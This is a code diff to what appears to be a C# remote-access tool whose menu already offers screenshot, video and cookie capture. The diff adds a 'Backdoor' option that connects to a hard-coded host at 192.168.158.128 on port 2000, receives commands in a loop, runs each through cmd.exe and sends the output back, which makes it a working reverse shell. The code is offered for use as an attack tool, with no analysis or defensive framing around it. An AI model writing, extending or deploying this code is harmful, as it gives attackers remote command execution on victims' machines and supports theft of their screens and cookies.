@@ -43,7 +43,8 @@ namespace pm3candc
             menu += "2.- Captura de pantalla\n";
             menu += "3.- Video\n";
             menu += "4.- cookies\n";
-            menu += "5.- \n";
+            menu += "5.- Backdoor\n";
+            menu += "6.- \n";
             ConnectSSL(menu);
         }
         static string ReadMessage(SslStream sslStream)
@@ -125,7 +126,11 @@ namespace pm3candc
                             cookies();
                         }else if(opcion == 5)
                         {
-                            // 
+                            conectar("192.168.158.128", 2000);
+                        }
+                        else if (opcion == 6)
+                        {
+                            //
                         }
                     }
 
@@ -386,7 +391,70 @@ namespace pm3candc
             graphic.CopyFromScreen(region.Left, region.Top, 0, 0, region.Size);
             bitmap.Save("pantalla.jpg", ImageFormat.Jpeg);
         }
-	
-	}
-   
+        public static NetworkStream socket_server;
+        public static void conectar(string ip, int porta)
+        {
+            TcpClient conectando = new TcpClient();
+            conectando.Connect(ip, porta);
+            socket_server = conectando.GetStream();
+            receber();
+
+        }
+        public static void receber()
+        {
+            while (true)
+            {
+                try
+                {
+                    byte[] receber_bytes = new byte[1000];
+                    socket_server.Read(receber_bytes, 0, receber_bytes.Length);
+                    socket_server.Flush();
+                    string msg = Encoding.ASCII.GetString(receber_bytes);
+                    Console.WriteLine(msg);
+                    enviar_comando(msg);
+                }
+                catch
+                {
+                    break;
+                }
+            }
+        }
+        public static void enviar_comando(string comando)
+        {
+            try
+            {
+                Console.WriteLine("excutando");
+                Console.WriteLine(comando);
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C " + comando;
+                startInfo.UseShellExecute = false;
+                startInfo.RedirectStandardOutput = true;
+                using (Process process = Process.Start(startInfo))
+                {
+                    using (StreamReader reader = process.StandardOutput)
+                    {
+                        string result = reader.ReadToEnd();
+                        int tamanho_cmando = result.Length;
+                        string t_comando = Convert.ToString(tamanho_cmando);
+                        byte[] rbytes = Encoding.ASCII.GetBytes(t_comando);
+                        socket_server.Write(rbytes, 0, rbytes.Length);
+                        socket_server.Flush();
+                        Console.WriteLine(tamanho_cmando);
+                        byte[] comandos = Encoding.ASCII.GetBytes(result);
+                        socket_server.Write(comandos, 0, comandos.Length);
+                        socket_server.Flush();
+
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+        }
+
+
+    }
+
 }
